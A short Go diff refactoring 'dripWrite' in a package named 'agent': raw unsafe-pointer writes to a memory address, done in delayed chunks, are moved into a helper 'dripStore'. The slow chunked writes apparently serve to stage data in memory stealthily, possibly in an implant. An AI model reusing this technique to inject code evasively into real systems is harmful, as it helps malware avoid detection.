@@ -3,7 +3,6 @@ package agent
 import (
 	"strconv"
 	"time"
-	"unsafe"
 )
 
 // dripWrite writes data to dst in small chunks with delays between each chunk.
@@ -14,9 +13,7 @@ func dripWrite(dst uintptr, data []byte) {
 	delayMs, _ := strconv.Atoi(DripDelayMs)
 	if chunkSize <= 0 || dst == 0 {
 		if dst != 0 {
-			for i, b := range data {
-				*(*byte)(unsafe.Pointer(dst + uintptr(i))) = b
-			}
+			dripStore(dst, data)
 		}
 		return
 	}
@@ -27,9 +24,7 @@ func dripWrite(dst uintptr, data []byte) {
 			end = len(data)
 		}
 		chunk := data[off:end]
-		for i, b := range chunk {
-			*(*byte)(unsafe.Pointer(dst + uintptr(off+i))) = b
-		}
+		dripStore(dst+uintptr(off), chunk)
 		if delay > 0 && end < len(data) {
 			time.Sleep(delay)
 		}
